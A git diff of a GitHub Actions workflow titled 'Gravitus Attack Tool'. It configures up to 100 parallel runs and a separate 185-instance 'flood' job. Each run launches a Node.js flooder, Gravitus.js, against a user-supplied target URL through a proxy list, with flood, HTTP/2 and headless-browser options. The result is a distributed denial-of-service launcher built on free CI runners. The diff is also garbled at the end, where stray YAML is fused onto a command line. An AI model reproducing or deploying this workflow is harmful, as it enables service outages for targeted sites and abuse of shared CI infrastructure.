@@ -3,14 +3,14 @@ name: Gravitus Attack Tool
 on:
   workflow_dispatch:
     inputs:
-      method:
-        description: 'HTTP Method (GET/POST)'
-        required: true
-        default: 'GET'
       target:
         description: 'Target URL'
         required: true
         default: 'https://example.com'
+      method:
+        description: 'HTTP Method (GET/POST)'
+        required: true
+        default: 'GET'
       duration:
         description: 'Duration in seconds'
         required: true
@@ -27,15 +27,142 @@ on:
         description: 'Proxy file name'
         required: true
         default: 'proxy.txt'
-      flood:
-        description: 'Enable flood mode'
-        type: boolean
-        default: true
-      debug:
-        description: 'Enable debug mode'
-        type: boolean
-        default: true
-      full:
+      options:
+        description: 'Options (flood,debug,full,http2) - Example: flood,debug,full,http2'
+        required: true
+        default: 'flood,debug,full,http2'
+      parallel_runs:
+        description: 'Number of parallel runs'
+        required: true
+        default: '100'
+
+jobs:
+  generate-matrix:
+    runs-on: ubuntu-latest
+    outputs:
+      matrix: ${{ steps.set-matrix.outputs.matrix }}
+    steps:
+    - name: Generate matrix
+      id: set-matrix
+      run: |
+        MATRIX=$(printf '{"run":['; for i in $(seq 1 ${{ inputs.parallel_runs }}); do printf '"%d"' $i; if [ $i -lt ${{ inputs.parallel_runs }} ]; then printf ','; fi; done; printf ']}')
+        echo "matrix=$MATRIX" >> $GITHUB_OUTPUT
+
+  run-gravitus:
+    needs: generate-matrix
+    runs-on: ubuntu-latest
+    strategy:
+      matrix: ${{ fromJson(needs.generate-matrix.outputs.matrix) }}
+    steps:
+    - name: Checkout repository
+      uses: actions/checkout@v4
+
+    - name: Setup Node.js
+      uses: actions/setup-node@v4
+      with:
+        node-version: '18'
+
+    - name: Install dependencies
+      run: |
+        npm install puppeteer-real-browser
+        npm install hpack
+        npm install colors
+        npx @puppeteer/browsers install chrome@stable
+
+    - name: Run Gravitus Attack
+      run: |
+        # Parse options
+        OPTIONS="${{ inputs.options }}"
+        FLOOD_FLAG=""
+        DEBUG_FLAG=""
+        FULL_FLAG=""
+        HTTP_VERSION="1"
+        
+        if [[ "$OPTIONS" == *"flood"* ]]; then
+          FLOOD_FLAG="--flood"
+        fi
+        
+        if [[ "$OPTIONS" == *"debug"* ]]; then
+          DEBUG_FLAG="--debug"
+        fi
+        
+        if [[ "$OPTIONS" == *"full"* ]]; then
+          FULL_FLAG="--full"
+        fi
+        
+        if [[ "$OPTIONS" == *"http2"* ]]; then
+          HTTP_VERSION="2"
+        fi
+        
+        node Gravitus.js \
+          "${{ inputs.method }}" \
+          "${{ inputs.target }}" \
+          "${{ inputs.duration }}" \
+          "${{ inputs.threads }}" \
+          "${{ inputs.rate }}" \
+          "${{ inputs.proxy_file }}" \
+          $FLOOD_FLAG \
+          $DEBUG_FLAG \
+          $FULL_FLAG \
+          --http $HTTP_VERSION
+
+  flood:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185]
+    steps:
+    - name: Checkout repository
+      uses: actions/checkout@v4
+
+    - name: Setup Node.js
+      uses: actions/setup-node@v4
+      with:
+        node-version: '18'
+
+    - name: Install dependencies
+      run: |
+        npm install puppeteer-real-browser
+        npm install hpack
+        npm install colors
+        npx @puppeteer/browsers install chrome@stable
+
+    - name: Run Flood Attack
+      run: |
+        # Parse options
+        OPTIONS="${{ inputs.options }}"
+        FLOOD_FLAG=""
+        DEBUG_FLAG=""
+        FULL_FLAG=""
+        HTTP_VERSION="1"
+        
+        if [[ "$OPTIONS" == *"flood"* ]]; then
+          FLOOD_FLAG="--flood"
+        fi
+        
+        if [[ "$OPTIONS" == *"debug"* ]]; then
+          DEBUG_FLAG="--debug"
+        fi
+        
+        if [[ "$OPTIONS" == *"full"* ]]; then
+          FULL_FLAG="--full"
+        fi
+        
+        if [[ "$OPTIONS" == *"http2"* ]]; then
+          HTTP_VERSION="2"
+        fi
+        
+        node Gravitus.js \
+          "${{ inputs.method }}" \
+          "${{ inputs.target }}" \
+          "${{ inputs.duration }}" \
+          "${{ inputs.threads }}" \
+          "${{ inputs.rate }}" \
+          "${{ inputs.proxy_file }}" \
+          $FLOOD_FLAG \
+          $DEBUG_FLAG \
+          $FULL_FLAG \
+          --http $HTTP_VERSION      full:
         description: 'Enable full mode'
         type: boolean
         default: true
